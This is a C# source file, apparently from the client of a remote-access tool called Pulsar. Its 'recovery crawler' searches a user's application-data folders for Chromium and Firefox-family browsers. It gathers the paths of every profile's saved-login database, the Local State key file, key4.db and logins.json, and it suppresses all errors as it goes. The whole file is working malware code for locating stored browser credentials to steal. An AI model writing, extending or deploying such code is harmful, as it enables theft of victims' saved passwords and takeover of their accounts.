﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Pulsar.Client.Recovery.Browsers;

namespace Pulsar.Client.Recovery.Crawler
{
    public class Crawl
    {
        public static List<AllBrowsers> Start()
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] rootDirs = { localAppData, appData };
            List<BrowserChromium> foundChromiumBrowsers = new List<BrowserChromium>();
            List<BrowserGecko> foundGeckoBrowsers = new List<BrowserGecko>();

            Parallel.ForEach(rootDirs, rootDir =>
            {
                if (Directory.Exists(rootDir))
                {
                    SearchDirectory(rootDir, foundChromiumBrowsers, foundGeckoBrowsers, rootDir == appData);
                }
            });

            return new List<AllBrowsers>
            {
                new AllBrowsers
                {
                    Chromium = foundChromiumBrowsers.ToArray(),
                    Gecko = foundGeckoBrowsers.ToArray()
                }
            };
        }

        private static void SearchDirectory(string directory, List<BrowserChromium> foundChromiumBrowsers, List<BrowserGecko> foundGeckoBrowsers, bool isRoaming, int depth = 0)
        {
            if (depth > 3) return;

            try
            {
                CheckForBrowser(directory, foundChromiumBrowsers, foundGeckoBrowsers, isRoaming);

                var subDirs = Directory.GetDirectories(directory);
                Parallel.ForEach(subDirs, dir =>
                {
                    SearchDirectory(dir, foundChromiumBrowsers, foundGeckoBrowsers, isRoaming, depth + 1);
                });
            }
            catch (Exception)
            {
                return;
            }
        }

        private static void CheckForBrowser(string path, List<BrowserChromium> foundChromiumBrowsers, List<BrowserGecko> foundGeckoBrowsers, bool isRoaming)
        {
            try
            {
                string userDataPath = Path.Combine(path, "User Data");
                string localStatePath = Path.Combine(userDataPath, "Local State");

                if (Directory.Exists(userDataPath) && File.Exists(localStatePath))
                {
                    List<ProfileChromium> profiles = new List<ProfileChromium>();

                    string defaultProfile = Path.Combine(userDataPath, "Default");
                    if (Directory.Exists(defaultProfile))
                    {
                        string loginDataPath = Path.Combine(defaultProfile, "Login Data");
                        if (File.Exists(loginDataPath))
                        {
                            profiles.Add(new ProfileChromium
                            {
                                Name = "Default",
                                LoginData = loginDataPath,
                                Path = defaultProfile
                            });
                        }
                    }

                    var profileDirs = Directory.GetDirectories(userDataPath)
                        .Where(dir => Path.GetFileName(dir).StartsWith("Profile "))
                        .Select(dir => Path.GetFileName(dir));

                    foreach (var profile in profileDirs)
                    {
                        string profilePath = Path.Combine(userDataPath, profile);
                        string loginDataPath = Path.Combine(profilePath, "Login Data");
                        if (File.Exists(loginDataPath))
                        {
                            profiles.Add(new ProfileChromium
                            {
                                Name = profile,
                                LoginData = loginDataPath,
                                Path = profilePath
                            });
                        }
                    }

                    if (profiles.Count > 0)
                    {
                        lock (foundChromiumBrowsers)
                        {
                            foundChromiumBrowsers.Add(new BrowserChromium
                            {
                                Name = Path.GetFileName(path),
                                LocalState = localStatePath,
                                Path = path,
                                Profiles = profiles.ToArray()
                            });
                        }
                    }
                }

                if (isRoaming)
                {
                    string profilesPath = Path.Combine(path, "Profiles");
                    if (Directory.Exists(profilesPath))
                    {
                        List<string> profiles = Directory.GetDirectories(profilesPath)
                            .Select(Path.GetFileName)
                            .Where(name => name.Contains(".default-"))
                            .ToList();

                        if (profiles.Count > 0)
                        {
                            string browserName = Directory.GetParent(path)?.Name + "\\" + Path.GetFileName(path);
                            lock (foundGeckoBrowsers)
                            {
                                foundGeckoBrowsers.Add(new BrowserGecko
                                {
                                    Name = browserName,
                                    Path = path,
                                    Key4 = Path.Combine(path, "key4.db"),
                                    Logins = Path.Combine(path, "logins.json"),
                                    ProfilesDir = profilesPath
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                return;
            }
        }
    }
}